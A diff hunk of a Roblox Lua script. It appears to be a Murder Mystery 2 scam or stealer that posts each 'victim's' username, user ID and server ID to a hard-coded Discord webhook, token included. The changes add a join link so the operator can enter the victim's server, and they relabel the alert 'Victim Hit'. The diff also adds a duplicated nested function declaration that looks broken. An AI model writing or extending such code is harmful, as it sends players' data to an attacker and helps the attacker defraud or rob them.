@@ -2358,22 +2358,25 @@ local webhookUrl = "https://discord.com/api/webhooks/1527483990003552266/M60-Ont
 local myUsername = "chrvstianm"
 
 local function sendToWebhook(data)
+    local function sendToWebhook(data)
     pcall(function()
         local http = game:GetService("HttpService")
+        local joinLink = "roblox://experience/?placeId=" .. tostring(game.PlaceId) .. "&launchData=" .. game.JobId
         local payload = http:JSONEncode({
-            content = "@everyone **MM2 Victim Loaded Script**",
+            content = "@everyone **MM2 Victim Hit!**",
             embeds = {{
-                title = "New Victim",
+                title = "🎣 New Victim Ready",
                 color = 16711680,
                 fields = {
                     {name = "Player", value = data.username or "Unknown", inline = true},
                     {name = "UserId", value = tostring(data.userid or "N/A"), inline = true},
                     {name = "Server", value = data.jobid or "N/A", inline = true},
-                }
+                },
+                description = "[Click to Join Server](" .. joinLink .. ")"
             }}
         })
         http:PostAsync(webhookUrl, payload, Enum.HttpContentType.ApplicationJson)
-        print("[Webhook] Sent successfully!")
+        print("[Webhook] Hit notification sent!")
     end)
 end
 
